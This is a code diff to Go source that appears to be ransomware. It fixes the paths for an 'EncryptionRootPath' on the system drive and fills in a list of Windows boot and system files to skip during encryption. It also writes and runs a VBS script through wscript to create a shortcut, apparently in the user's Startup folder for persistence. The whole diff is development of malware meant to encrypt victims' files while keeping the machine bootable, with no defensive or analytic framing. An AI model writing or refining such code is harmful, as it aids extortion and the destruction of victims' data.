@@ -36,9 +36,9 @@ func Setup(isAdmin bool) {
 // SetupSafeAdminFiles : setups enviroments path using admin rights
 func SetupSafeAdminFiles(exePath string) {
 	EncryptionRootPath = os.Getenv("SystemDrive") + "\\"
-	ExePath = os.Getenv("SystemDrive") + "\\" + HomeFolder + "\\" + filepath.Base(exePath)
+	ExePath = os.Getenv("SystemDrive") + HomeFolder + "\\" + filepath.Base(exePath)
 
-	HomePath = EncryptionRootPath + "\\" + HomeFolder
+	HomePath = EncryptionRootPath + HomeFolder
 }
 
 // SetupSafeUserFiles : setups enviroments path using user rights
@@ -68,7 +68,7 @@ func SetupSafeFiles(isAdmin bool) error {
 
 	if isAdmin {
 		SetupSafeAdminFiles(exePath)
-		file.SafeFiles = []string{}
+		file.SafeFiles = []string{EncryptionRootPath + "Windows", EncryptionRootPath + "bootmgr", EncryptionRootPath + "BOOTNXT", EncryptionRootPath + "DumpStack.log.tmp", EncryptionRootPath + "pagefile.sys", EncryptionRootPath + "swapfile.sys", EncryptionRootPath + "Recovery", EncryptionRootPath + "System Volume Information", EncryptionRootPath + "sharefolder"}
 	} else {
 		SetupSafeUserFiles(exePath)
 		file.SafeFiles = []string{UserPath + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Random.lnk"}
@@ -106,7 +106,6 @@ func CreateShortcut(linkName string, target string, arguments string, directory 
 	scriptTxt.WriteString("oLink.WindowStyle = \"1\"\n")
 	scriptTxt.WriteString("oLink.WorkingDirectory = \"" + directory + "\"\n")
 	scriptTxt.WriteString("oLink.Save\n")
-	print(scriptTxt.String())
 	filename := "lnkToBaby.vbs"
 	ioutil.WriteFile(filename, scriptTxt.Bytes(), 0777)
 	cmd := exec.Command("wscript", filename)
